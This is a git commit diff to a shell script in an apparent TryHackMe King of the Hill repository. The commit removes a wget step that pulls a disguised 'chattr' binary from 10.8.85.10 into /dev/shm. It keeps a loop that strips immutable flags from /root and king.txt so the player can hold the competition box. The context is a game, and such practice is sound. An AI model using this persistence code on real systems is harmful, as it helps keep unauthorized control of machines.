0c68d359e02954477e86771ed20cec7cbc05effb
Faruk <98034193+farukerdem34@users.noreply.github.com>
2023-08-29 06:19:14 -0400

    Update script.sh

--- THM-KOTH/scripts/script.sh
+++ THM-KOTH/scripts/script.sh
@@ -1,18 +1,4 @@
-get_chattr(){
-     cd /dev/shm
-     wget 10.8.85.10/chattr
-     mv chattr asd
-     chmod 100 asd
-}
-get_chattr
 while true; do
-     if ls -l /dev/shm/asd
-          then
-               echo OK
-          else
-               get_chattr
-          	echo DONE
-     fi
      /dev/shm/asd -ia /root > /dev/null
      /dev/shm/asd -ia /root/king.txt >/dev/null
      chmod 600 /root/king.txt
